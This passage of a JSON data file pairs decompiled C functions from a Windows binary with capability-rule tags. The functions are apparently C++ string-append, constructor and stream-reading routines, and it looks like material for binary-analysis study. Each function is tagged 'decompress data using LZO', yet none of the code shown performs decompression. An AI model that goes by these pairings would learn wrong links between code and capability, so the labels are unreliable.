        "decompiled_code": "\nint32_t * __thiscall fcn.00483bd0(int32_t *param_1, ushort *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *in_stack_ffffffd8;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    puVar3 = *param_1;\n    if (0x1ffffffeU - *(puVar3 + -6) < param_3) {\n        fcn.004be310(0x523c46);\n        iVar6 = *(*in_stack_ffffffd8 + -0xc);\n        if (iVar6 != 0) {\n            iVar4 = *extraout_ECX;\n            uVar5 = *(iVar4 + -0xc) + iVar6;\n            if ((uVar5 < *(iVar4 + -8) || uVar5 == *(iVar4 + -8)) && (*(iVar4 + -4) < 1)) {\n                iVar4 = *extraout_ECX;\n                puVar2 = *in_stack_ffffffd8;\n                puVar3 = iVar4 + *(iVar4 + -0xc) * 2;\n            }\n            else {\n                fcn.00484bb0(uVar5);\n                iVar4 = *extraout_ECX;\n                puVar2 = *in_stack_ffffffd8;\n                puVar3 = iVar4 + *(iVar4 + -0xc) * 2;\n            }\n            if (iVar6 == 1) {\n                *puVar3 = *puVar2;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar3, puVar2, iVar6 * 2);\n                iVar4 = *extraout_ECX;\n            }\n            *(iVar4 + -4) = 0;\n            *(iVar4 + -0xc) = uVar5;\n            *(iVar4 + uVar5 * 2) = 0;\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    uVar5 = *(puVar3 + -6) + param_3;\n    if ((*(puVar3 + -4) <= uVar5 && uVar5 != *(puVar3 + -4)) || (piVar1 = puVar3 + -2,  puVar3 = *param_1,  0 < *piVar1)\n       ) {\n        if ((puVar3 <= param_2) && (param_2 <= puVar3 + *(puVar3 + -6))) {\n            iVar6 = param_2 - puVar3;\n            fcn.00484bb0(uVar5);\n            puVar3 = *param_1;\n            param_2 = iVar6 + puVar3;\n            puVar2 = puVar3 + *(puVar3 + -6);\n            goto joined_r0x00483c7d;\n        }\n        fcn.00484bb0(uVar5);\n        puVar3 = *param_1;\n    }\n    puVar2 = puVar3 + *(puVar3 + -6);\njoined_r0x00483c7d:\n    if (param_3 == 1) {\n        *puVar2 = *param_2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar2, param_2, param_3 * 2);\n        puVar3 = *param_1;\n    }\n    *(puVar3 + -2) = 0;\n    *(puVar3 + -6) = uVar5;\n    puVar3[uVar5] = 0;\n    return param_1;\n}\n",
        "token_count": 836
    },
    "00483cb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00483cb0(int32_t *param_1, int32_t *param_2)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    iVar2 = *(*param_2 + -0xc);\n    if (iVar2 != 0) {\n        iVar4 = *param_1;\n        uVar5 = *(iVar4 + -0xc) + iVar2;\n        if ((uVar5 < *(iVar4 + -8) || uVar5 == *(iVar4 + -8)) && (*(iVar4 + -4) < 1)) {\n            iVar4 = *param_1;\n            puVar3 = *param_2;\n            puVar1 = iVar4 + *(iVar4 + -0xc) * 2;\n        }\n        else {\n            fcn.00484bb0(uVar5);\n            iVar4 = *param_1;\n            puVar3 = *param_2;\n            puVar1 = iVar4 + *(iVar4 + -0xc) * 2;\n        }\n        if (iVar2 == 1) {\n            *puVar1 = *puVar3;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar1, puVar3, iVar2 * 2);\n            iVar4 = *param_1;\n        }\n        *(iVar4 + -4) = 0;\n        *(iVar4 + -0xc) = uVar5;\n        *(iVar4 + uVar5 * 2) = 0;\n        return param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 370
    },
    "00483e50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00483e50(int32_t *param_1, uint32_t param_2, ushort param_3)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint extraout_ECX;\n    uint32_t uVar3;\n    uint uStack56;\n    int32_t *piStack36;\n    \n    iVar1 = *param_1;\n    if (param_2 <= 0x1ffffffeU - *(iVar1 + -0xc)) {\n        uVar3 = *(iVar1 + -0xc) + param_2;\n        if ((uVar3 < *(iVar1 + -8) || uVar3 == *(iVar1 + -8)) && (*(iVar1 + -4) < 1)) {\n            iVar1 = *param_1;\n            puVar2 = iVar1 + *(iVar1 + -0xc) * 2;\n        }\n        else {\n            fcn.00484bb0(uVar3);\n            iVar1 = *piStack36;\n            puVar2 = iVar1 + *(iVar1 + -0xc) * 2;\n        }\n        if (param_2 == 1) {\n            *puVar2 = param_3;\n        }\n        else if (param_2 != 0) {\n            do {\n                *puVar2 = param_3;\n                puVar2 = puVar2 + 1;\n                param_2 = param_2 - 1;\n            } while (param_2 != 0);\n        }\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0xc) = uVar3;\n        *(iVar1 + uVar3 * 2) = 0;\n        return 0;\n    }\n    fcn.004be310(0x523c46);\n    fcn.004839e0(uStack56, param_2);\n    return extraout_ECX;\n}\n",
        "token_count": 417
    },
    "00484e80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00484e80(int32_t *param_1, ushort param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_1;\n    uVar1 = *(iVar2 + -0xc) + 1;\n    if ((*(iVar2 + -8) <= uVar1 && uVar1 != *(iVar2 + -8)) || (0 < *(iVar2 + -4))) {\n        fcn.00484bb0(uVar1);\n    }\n    iVar2 = *param_1;\n    *(iVar2 + *(iVar2 + -0xc) * 2) = param_2;\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar1;\n    *(iVar2 + uVar1 * 2) = 0;\n    return;\n}\n",
        "token_count": 197
    },
    "00485ad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00485ad0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x20) = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    in_ECX[0x24] = 0;\n    *in_ECX = 0x527ea8;\n    in_ECX[3] = 0x527ebc;\n    in_ECX[1] = 0;\n    fcn.004bbb80(arg_8h);\n    in_ECX[2] = 0x527ed0;\n    in_ECX[3] = 0x527ee4;\n    fcn.004bbb80(arg_8h);\n    *in_ECX = 0x52be2c;\n    in_ECX[3] = 0x52be54;\n    in_ECX[2] = 0x52be40;\n    return;\n}\n",
        "token_count": 275
    },
    "00485bb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00485bb0(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    param_1[0x1f] = 0;\n    *(param_1 + 0x20) = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    param_1[0x24] = 0;\n    *param_1 = 0x527ea8;\n    param_1[3] = 0x527ebc;\n    param_1[1] = 0;\n    fcn.004bbb80(0);\n    param_1[2] = 0x527ed0;\n    param_1[3] = 0x527ee4;\n    fcn.004bbb80(0);\n    *param_1 = 0x52be2c;\n    param_1[3] = 0x52be54;\n    param_1[2] = 0x52be40;\n    return;\n}\n",
        "token_count": 264
    },
    "00485d40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00485d40(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bbb80(arg_ch);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.004bbb80(arg_ch);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 242
    },
    "00485dd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.00485dd0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_8h;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.004bbb80(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 242
    },
    "00485fb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Variable defined which should be unmapped: var_ch_2\n// WARNING: Removing unreachable block (ram,0x00486a60)\n// WARNING: Removing unreachable block (ram,0x00486940)\n// WARNING: Removing unreachable block (ram,0x00486820)\n// WARNING: Removing unreachable block (ram,0x00486700)\n// WARNING: Removing unreachable block (ram,0x004865e0)\n// WARNING: Removing unreachable block (ram,0x004864c0)\n// WARNING: Removing unreachable block (ram,0x004863a0)\n// WARNING: Removing unreachable block (ram,0x00486280)\n// WARNING: Removing unreachable block (ram,0x00486160)\n// WARNING: Removing unreachable block (ram,0x00486040)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.00485fb0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *extraout_ECX_06;\n    int32_t *extraout_ECX_07;\n    int32_t *extraout_ECX_08;\n    int32_t *extraout_ECX_09;\n    int32_t *extraout_ECX_10;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    int32_t extraout_EDX_07;\n    int32_t extraout_EDX_08;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    ulong uVar11;\n    uint var_1dh;\n    uint var_ch;\n    char cStack989;\n    uint var_1ch_12;\n    int32_t in_stack_fffffc48;\n    uchar *in_stack_fffffc4c;\n    uint32_t var_ch_12;\n    uint var_bp_8h;\n    char cStack873;\n    uint32_t uStack872;\n    uint uStack856;\n    int32_t iStack852;\n    uint var_1dh_11;\n    uint var_ch_11;\n    uint var_1dh_10;\n    uint var_ch_10;\n    uint var_1dh_9;\n    uint var_ch_9;\n    uint var_1dh_8;\n    uint var_ch_8;\n    uint var_1dh_7;\n    uint var_ch_7;\n    uint var_1dh_6;\n    uint var_ch_6;\n    uint var_1dh_5;\n    uint var_ch_5;\n    uint var_1dh_4;\n    uint var_ch_4;\n    uint var_1dh_3;\n    uint var_ch_3;\n    uint var_1dh_2;\n    uint var_ch_2;\n    \n    fcn.00487fd0();\n    if (var_1dh_2 == '\\0') {\n        return param_1;\n    }\n    piVar5 = *(param_1 + *(*param_1 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x30))();\n        return param_1;\n    }\n    fcn.004bde60();\n    if (extraout_EDX == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return param_1;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_3 == '\\0') {\n        return extraout_ECX;\n    }\n    piVar5 = *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 8))();\n        return extraout_ECX;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_00 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_4 == '\\0') {\n        return extraout_ECX_00;\n    }\n    piVar5 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x28))();\n        return extraout_ECX_00;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_01 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_00;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_5 == '\\0') {\n        return extraout_ECX_01;\n    }\n    piVar5 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x2c))();\n        return extraout_ECX_01;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_02 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_01;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_6 == '\\0') {\n        return extraout_ECX_02;\n    }\n    piVar5 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x24))();\n        return extraout_ECX_02;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_03 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_02;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_7 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar5 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x14))();\n        return extraout_ECX_03;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_04 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_03;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_8 == '\\0') {\n        return extraout_ECX_04;\n    }\n    piVar5 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0xc))();\n        return extraout_ECX_04;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_05 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_04;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_9 == '\\0') {\n        return extraout_ECX_05;\n    }\n    piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x18))();\n        return extraout_ECX_05;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_06 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_05;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_10 == '\\0') {\n        return extraout_ECX_06;\n    }\n    piVar5 = *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x10))();\n        return extraout_ECX_06;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_07 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_06;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (var_1dh_11 == '\\0') {\n        return extraout_ECX_07;\n    }\n    iStack852 = *(*extraout_ECX_07 + -0xc) + extraout_ECX_07;\n    if (*(iStack852 + 0x84) != NULL) {\n        (**(**(iStack852 + 0x84) + 0x1c))();\n        return extraout_ECX_07;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_08 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_07;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    uStack856 = fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    piVar5 = extraout_ECX_08;\n    fcn.00487fd0(extraout_ECX_08, 0);\n    if (cStack873 == '\\0') {\n        return extraout_ECX_08;\n    }\n    uStack872 = 0;\n    iVar9 = *(*extraout_ECX_08 + -0xc) + extraout_ECX_08;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffffffff, 0, 0xffffffff, iVar9, &stack0xfffffc98, 0x4869ee);\ncode_r0x00486b69:\n        if (uStack872 == 0) {\n            return extraout_ECX_08;\n        }\n        fcn.004bbce0(uStack872 | *(extraout_ECX_08 + *(*extraout_ECX_08 + -0xc) + 0x14));\n        return extraout_ECX_08;\n    }\n    uVar11 = fcn.004bde60();\n    if (uVar11 >> 0x20 == 1) {\n        fcn.004c2e40(uVar11);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        piVar3 = fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40(uVar11);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x00486b69;\n        }\n        fcn.004c32d0();\n        piVar3 = extraout_ECX_08;\n    }\n    fcn.004c2fb0();\n    uVar4 = fcn.0043a8e0(piVar3);\n    fcn.004c2fb0();\n    fcn.0043a8e0(uVar4);\n    piVar3 = *(extraout_ECX_09 + *(*extraout_ECX_09 + -0xc) + 0x7c);\n    if (piVar3 != NULL) {\n        if (*(piVar3 + 7) == '\\0') {\n            fcn.004512b0();\n            iVar9 = 10;\n            if (*(*piVar3 + 0x18) != 0x451560) {\n                cVar2 = (**(*piVar3 + 0x18))(10);\n                iVar9 = cVar2;\n            }\n        }\n        else {\n            iVar9 = *(piVar3 + 0x27);\n        }\n        piVar5 = fcn.00486c90(0x486b0e, piVar5, iVar9);\n        return piVar5;\n    }\n    fcn.004bde60();\n    extraout_ECX_10[1] = 0;\n    fcn.00487fd0(extraout_ECX_10, 1);\n    if (cStack989 == '\\0') {\n        if (0 < in_stack_fffffc48) {\n            *in_stack_fffffc4c = 0;\n            iVar9 = extraout_ECX_10[1];\n            goto joined_r0x00486d50;\n        }\n        iVar9 = extraout_ECX_10[1];\ncode_r0x00486df6:\n        if (iVar9 != 0) {\n            return extraout_ECX_10;\n        }\n    }\n    else {\n        piVar5 = *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x78);\n        puVar7 = piVar5[2];\n        if (puVar7 <= piVar5[3] && piVar5[3] != puVar7) goto code_r0x00486d5e;\ncode_r0x00486d20:\n        uVar6 = (**(*piVar5 + 0x24))();\n        iVar9 = extraout_ECX_10[1];\n        puVar10 = in_stack_fffffc4c;\n        if (iVar9 + 1 < in_stack_fffffc48) {\n            do {\n                in_stack_fffffc4c = puVar10;\n                if (uVar6 == 0xffffffff) {\ncode_r0x00486d9e:\n                    uVar6 = 2;\n                    puVar10 = in_stack_fffffc4c;\ncode_r0x00486da3:\n                    if (0 < in_stack_fffffc48) {\n                        *puVar10 = 0;\n                    }\n                    if (extraout_ECX_10[1] == 0) {\n                        uVar6 = uVar6 | 4;\n                    }\n                    else if (uVar6 == 0) {\n                        return extraout_ECX_10;\n                    }\n                    goto code_r0x00486ce1;\n                }\n                if ((var_ch_12 & 0xff) == uVar6) {\n                    uVar6 = 0;\n                    goto code_r0x00486da3;\n                }\n                in_stack_fffffc4c = puVar10 + 1;\n                *puVar10 = uVar6;\n                puVar7 = piVar5[2];\n                puVar8 = piVar5[3];\n                extraout_ECX_10[1] = extraout_ECX_10[1] + 1;\n                if (puVar7 < puVar8) {\n                    puVar7 = puVar7 + 1;\n                    piVar5[2] = puVar7;\n                }\n                else {\n                    iVar9 = (**(*piVar5 + 0x28))();\n                    if (iVar9 == -1) goto code_r0x00486d9e;\n                    puVar7 = piVar5[2];\n                    puVar8 = piVar5[3];\n                }\n                if (puVar8 <= puVar7) goto code_r0x00486d20;\ncode_r0x00486d5e:\n                iVar9 = extraout_ECX_10[1];\n                uVar6 = *puVar7;\n                puVar10 = in_stack_fffffc4c;\n                if (in_stack_fffffc48 <= iVar9 + 1) break;\n            } while( true );\n        }\n        if (uVar6 == 0xffffffff) {\n            if (0 < in_stack_fffffc48) {\n                *in_stack_fffffc4c = 0;\n                iVar9 = extraout_ECX_10[1];\n            }\n            if (iVar9 == 0) {\n                uVar6 = 6;\n            }\n            else {\n                uVar6 = 2;\n            }\n            goto code_r0x00486ce1;\n        }\n        if (in_stack_fffffc48 < 1) goto code_r0x00486df6;\n        *in_stack_fffffc4c = 0;\n        iVar9 = extraout_ECX_10[1];\njoined_r0x00486d50:\n        if (iVar9 != 0) {\n            return extraout_ECX_10;\n        }\n    }\n    uVar6 = 4;\ncode_r0x00486ce1:\n    fcn.004bbce0(uVar6 | *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x14));\n    return extraout_ECX_10;\n}\n",
        "token_count": 6524
    },
    "00486f30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
